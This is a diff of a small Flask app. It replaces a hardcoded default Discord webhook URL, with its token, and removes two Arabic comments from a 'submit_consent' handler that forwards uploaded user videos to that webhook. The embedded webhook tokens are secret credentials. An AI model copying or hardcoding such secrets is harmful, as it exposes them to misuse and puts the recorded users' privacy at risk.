@@ -7,7 +7,7 @@ app = Flask(__name__)
 
 DISCORD_WEBHOOK_URL = os.getenv(
     "DISCORD_WEBHOOK_URL",
-    "https://discord.com/api/webhooks/1566409173095157824/1Wa4cp3S4yP-SdSedfdn7RjI2rNS4J_ztZaFZP1XS2-buSYOT8DMYZidArKz1mPXdMYk"
+    "https://discord.com/api/webhooks/1566422909369589892/jC5rEnmWbWzF8c6muws7A66fkM5Xr7kvo4TQxrURo0x-4d6gdbfSuEL7mQLnevOrCExq"
 )
 
 @app.route("/")
@@ -72,11 +72,8 @@ def submit_consent():
     try:
         files = {}
         if video_file:
-            # قراءة الملف وإرساله مباشرة بالاسم الذي حدده المتصفح
             filename = video_file.filename or "recording.mp4"
             file_bytes = video_file.read()
-            
-            # تحديد الـ Content-Type الصحيح لكي يعرضه ديسكورد كفيديو
             content_type = "video/mp4" if filename.endswith(".mp4") else "video/webm"
             
             files = {
